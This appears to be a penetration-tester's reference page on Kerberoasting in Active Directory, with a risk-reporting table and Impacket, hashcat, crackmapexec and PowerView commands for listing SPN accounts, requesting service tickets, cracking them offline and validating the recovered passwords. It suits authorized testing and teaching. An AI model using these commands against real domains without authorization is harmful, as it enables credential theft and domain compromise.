---
title: "Kerberoasting"
description: "Requesting Kerberos service tickets for SPN accounts and cracking them offline to recover service-account passwords."
tags:
  - Active Directory
  - Kerberos
  - Kerberoasting
  - Impacket
  - Hashcat
---

# Kerberoasting

Kerberoasting targets accounts that have a **Service Principal Name (SPN)** set — in practice, domain accounts running a service (SQL, web, backup agents) instead of a built-in local service account. The attack needs almost nothing: a cleartext password, an NTLM hash, or any shell as a domain user (or SYSTEM on a domain-joined host), plus knowledge of which host is the DC.

## Why it works

An SPN maps a service instance to the account running it. **Any authenticated domain user can request a Kerberos service ticket (TGS) for any SPN in the domain** — that's by design, it's how Kerberos authorizes access to the service in the first place. The catch is in how the ticket is built: the TGS is **encrypted with the service account's own NTLM hash**. Request the ticket, pull it off the wire, and you have an offline-crackable artifact tied directly to that account's password — no interaction with the service itself required, and (where trusts allow) this works across forest boundaries too.

!!! note "A TGS hash is not a valid credential by itself"
    Getting the ticket only gets you a hash to crack. Hashcat/John still have to recover the actual password from it, and unlike NTLM, Kerberos TGS hashes can be slow to crack — a genuinely strong service-account password may simply not fall in reasonable time.

## Why it's so effective in practice

- Service accounts are frequently **local admin** on the boxes they serve, or outright members of **Domain Admins** (directly, or via nesting).
- They're also disproportionately likely to have **weak or reused passwords** — sometimes literally `password = username` — because they were set up once years ago and never rotated.
- Cracking even an unprivileged-looking service account can cascade: an SPN like `MSSQL/SRV01` cracked to a sysadmin login on that instance means `xp_cmdshell` and RCE on the SQL server.

## Where you can run it from

- A non-domain-joined Linux host, with valid domain creds
- A domain-joined Linux host, as root (after pulling a keytab)
- A domain-joined Windows host, as a domain user or as SYSTEM
- A non-domain-joined Windows host, via `runas /netonly`

## Attacking from Linux — Impacket GetUserSPNs.py

```bash
# from a cloned Impacket checkout
sudo python3 -m pip install .
```

### List SPN accounts first — don't request blind

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/forend
```

This shows the SPN, account name, group membership, and when the password was last set — **before** you request anything. Check group membership here: an SPN account already sitting in Domain Admins is your priority target.

### Request tickets

```bash
# every SPN account at once
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/forend -request

# a single account
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/forend -request-user sqldev

# save to a file instead of stdout, for a GPU cracking rig
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/forend -request-user sqldev -outputfile sqldev_tgs
```

| Flag | Purpose |
| :--- | :--- |
| `-dc-ip` | Domain Controller IP |
| `-request` | Request every SPN account's ticket |
| `-request-user <user>` | Request one account's ticket |
| `-outputfile <file>` | Write tickets to a file |
| `-hashes LMHASH:NTHASH` | Authenticate with a hash instead of a password |
| `-k` | Use a Kerberos ticket for auth |

The output is a `$krb5tgs$23$*...`-prefixed hash, ready for Hashcat or John.

### Crack it offline

```bash
# etype 23 (RC4-HMAC) is the most common, and the easiest to crack
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

| Etype | Algorithm | Hashcat mode |
| :--- | :--- | :--- |
| 23 | RC4-HMAC | **13100** |
| 17 | AES-128 | 19600 |
| 18 | AES-256 | 19700 |

### Validate the cracked credential

```bash
sudo crackmapexec smb <DC_IP> -u sqldev -p 'database!'
# (Pwn3d!) here means sqldev was a member of Domain Admins — domain compromise
```

```text
GetUserSPNs.py (list)  →  check group membership  →  -request / -request-user  →  -outputfile
  →  hashcat -m 13100  →  validate with crackmapexec  →  if privileged, domain compromise
```

## Attacking from Windows

The same attack is available from PowerView and Rubeus without ever touching Linux:

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName   # list
Get-DomainSPNTicket -Identity sqldev                                   # request a ticket (PowerView)
```

`setspn.exe` and Mimikatz can also list and request, and Rubeus adds full ticket lifecycle control (roasting, renewal, forging) in one tool.

## Reporting it honestly

Kerberoastable accounts are present on nearly every AD estate — the risk is in what cracks, not just that SPNs exist.

| Outcome | Risk rating |
| :--- | :--- |
| Cracked TGS leads to Domain Admin or a clear path to it | **High** |
| Cracked TGS only yields low-privilege accounts, no further access | Still report, but **lower** |
| Nothing cracks — strong service-account passwords | **Medium** — the exposure exists regardless; a future password weakening, or a determined attacker with a larger GPU rig, could still succeed |

## Next

A Kerberoasted Domain Admin — or any privileged account — usually ends the engagement's escalation phase outright. If it only yields more low-privilege accounts, feed them back into [credentialed enumeration](credentialed-enumeration.md) and [BloodHound](bloodhound.md) to keep tracing a path upward.
